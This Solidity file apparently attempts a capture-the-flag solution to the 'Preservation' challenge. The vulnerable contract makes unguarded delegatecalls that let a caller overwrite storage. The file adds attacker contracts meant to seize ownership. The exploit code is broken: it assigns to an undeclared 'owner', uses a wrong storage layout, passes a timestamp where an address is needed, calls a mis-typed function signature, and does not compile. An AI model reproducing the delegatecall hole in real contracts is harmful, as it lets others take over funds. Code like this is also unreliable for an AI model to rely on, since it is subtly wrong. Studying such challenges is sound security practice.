// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

/* Library that the initial thought it was calling
// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
*/

contract MaliciousLibrary {
    uint storedTime;

    function setTime(uint _time) public {
        owner = tx.origin;
    }
}

contract getOwner {
    Preservation public preserve;
    address trueOwner;

    constructor(address _presCon) public {
        preserve = Preservation(_presCon);
        trueOwner = preserve.owner;
    }

    function takeover() returns (address success) {
        uint256 curTime = block.timestamp - 5;
        address(preserve).call(abi.encodeWithSignature("setFirstTime(uint)", curTime);;
        trueOwner = preserve.owner;
        return trueOwner;
    }
}